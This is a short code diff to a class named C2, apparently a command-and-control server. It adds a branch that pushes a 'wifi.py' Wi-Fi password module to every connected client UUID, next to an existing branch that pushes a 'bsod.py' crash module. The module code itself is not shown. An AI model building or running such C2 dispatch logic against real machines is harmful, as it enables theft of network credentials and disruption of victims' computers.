@@ -119,6 +119,10 @@ class C2:
                 for uuid in uuids:
                     self.sio.emit('pem', {"uuid": uuid, "url": 'client/pem/bsod.py'})
 
+            if explotation_module_type == "wifi-password":
+                for uuid in uuids:
+                    self.sio.emit('pem', {"uuid": uuid, "url": 'client/pem/wifi.py'})
+
 
 
             
